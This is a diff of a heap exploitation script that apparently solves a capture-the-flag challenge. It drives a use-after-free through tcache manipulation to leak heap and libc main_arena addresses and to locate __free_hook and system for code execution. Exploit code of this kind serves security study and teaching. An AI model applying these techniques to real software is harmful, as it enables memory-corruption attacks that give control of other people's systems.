@@ -44,18 +44,12 @@ def delete():
     ru("Index: ")
     sl("0")
 
-add(0x78)
-delete()
-add(0x68)
-delete()
-add(0x58)
-delete()
-add(0x48)
-delete()
+for i in range(8):
+    add(0x78)
 #chunk B
 add(0x38)
 #write prev_size of extended tcache info chunk
-edit(p64(0) * 6 + p64(0x430))
+edit("A" * 8 * 6 + p64(0x430))
 delete()
 #self-looped, address in chunk
 #show after delete(UAF)
@@ -63,7 +57,6 @@ delete()
 add(0x20)
 delete()
 delete()
-# pause()
 show()
 heap_addr = u64(rl()[:6].ljust(8, "\0"))
 heap_base_addr = heap_addr - 0x440
@@ -71,7 +64,6 @@ log.info("Heap addr (add offset 0x440) : " + hex(heap_base_addr))
 
 #edit pointer to point to heap base addr to edit size field
 edit(p64(heap_base_addr))
-# pause()
 #alloc middle chunks
 add(0x20)
 #alloc tcache info chunk(size:0x260)
@@ -92,7 +84,7 @@ add(0x10)
 add(0x10)
 delete()
 show()
-main_arena_addr = u64(rl()[:6].ljust(8, "\0")) - 96
+main_arena_addr = u64(rl()[:6].ljust(8, '\0')) - 96
 free_hook_addr = main_arena_addr + 0x1ca8
 system_addr = main_arena_addr - 0x36d4d0
 log.info("free hook addr: " + hex(free_hook_addr))
